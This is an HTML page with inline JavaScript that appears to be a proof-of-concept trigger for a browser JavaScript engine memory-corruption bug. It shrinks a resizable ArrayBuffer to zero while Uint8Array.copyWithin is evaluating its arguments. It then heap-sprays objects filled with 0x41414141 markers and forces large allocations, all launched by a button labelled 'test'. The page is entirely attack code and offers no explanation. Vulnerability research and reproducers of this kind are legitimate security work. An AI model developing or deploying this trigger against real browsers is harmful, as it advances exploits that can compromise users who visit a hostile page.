<!DOCTYPE html>
<html>
<head>
    <script>
        async function trigger() {
            let spray = [];
            console.log("Starting test...");
            for (let i = 0; i < 10; i++) {
                try {
                    let buffer = new ArrayBuffer(0x1000, { maxByteLength: 0x10000 });
                    let array = new Uint8Array(buffer);
                    function resize() {
                        buffer.resize(0);
                        return 0;
                    }
                    array.copyWithin(0, -resize(), -resize());
                    spray.push({ ptr: new Array(64).fill(0x41414141), data: new Array(64).fill("test") });
                } catch (e) {
                    console.log("Error:", e);
                }
                let largeObject = new Array(250000).fill(0);
                largeObject = null;
            }
            spray = null;
            console.log("Test complete");
        }
    </script>
</head>
<body>
    <button id="test" onclick="trigger()">test</button>
</body>
</html>
